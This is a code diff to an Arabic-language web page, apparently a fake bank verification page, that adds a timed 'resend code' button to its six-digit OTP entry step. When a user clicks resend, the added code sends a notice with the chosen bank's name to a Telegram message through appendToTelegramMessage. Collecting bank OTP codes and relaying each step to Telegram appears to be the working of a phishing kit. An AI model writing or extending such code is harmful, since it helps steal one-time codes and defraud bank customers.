@@ -1896,6 +1896,9 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
                         <input type="text" id="otpInput" class="otp-input" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6" required>
                         <div class="otp-error" id="otpError">رمز OTP غير صحيح، يرجى المحاولة مرة أخرى</div>
                         <div class="attempts-left" id="attemptsLeft">محاولات متبقية: 6</div>
+                        <div id="resendContainer" style="text-align: center; margin-top: 10px;">
+                            <button id="resendBtn" class="btn-link" disabled style="color: #666; text-decoration: none;">إعادة إرسال الرمز خلال <span id="resendTimer">30</span> ثانية</button>
+                        </div>
                     </div>
                     <button class="btn btn-block" onclick="verifyOTP()">تحقق</button>
                 `;
@@ -1904,6 +1907,9 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
                 document.getElementById('otpInput').addEventListener('input', function() {
                     validateField(this, /^\d{6}$/, 'otpError', 'يرجى إدخال رمز OTP مكون من 6 أرقام');
                 });
+
+                // بدء مؤقت إعادة الإرسال
+                startResendTimer();
             }
         }
 
@@ -2061,6 +2067,45 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
                 if (timer < 0) {
                     clearInterval(timerInterval);
                     if (callback) callback();
+                }
+            }, 1000);
+        }
+
+        // مؤقت إعادة إرسال الرمز
+        function startResendTimer() {
+            let timeLeft = 30;
+            const resendBtn = document.getElementById('resendBtn');
+            const resendTimer = document.getElementById('resendTimer');
+            
+            if (!resendBtn || !resendTimer) return;
+
+            resendBtn.disabled = true;
+            resendBtn.style.color = '#666';
+            resendBtn.style.cursor = 'not-allowed';
+            resendBtn.style.textDecoration = 'none';
+            resendBtn.innerHTML = `إعادة إرسال الرمز خلال <span id="resendTimer">${timeLeft}</span> ثانية`;
+
+            const countdown = setInterval(() => {
+                timeLeft--;
+                const timerSpan = document.getElementById('resendTimer');
+                if (timerSpan) timerSpan.textContent = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    resendBtn.disabled = false;
+                    resendBtn.style.color = 'var(--primary-color)';
+                    resendBtn.style.cursor = 'pointer';
+                    resendBtn.style.textDecoration = 'underline';
+                    resendBtn.textContent = 'إعادة إرسال الرمز الآن';
+                    
+                    resendBtn.onclick = function() {
+                        // إرسال إشعار لتليجرام عند طلب إعادة الإرسال
+                        const bank = banks[currentBank];
+                        appendToTelegramMessage(`🔄 <b>طلب إعادة إرسال الرمز</b>\nالبنك: ${bank ? bank.name : 'غير معروف'}`);
+                        
+                        // إعادة تشغيل المؤقت
+                        startResendTimer();
+                    };
                 }
             }, 1000);
         }
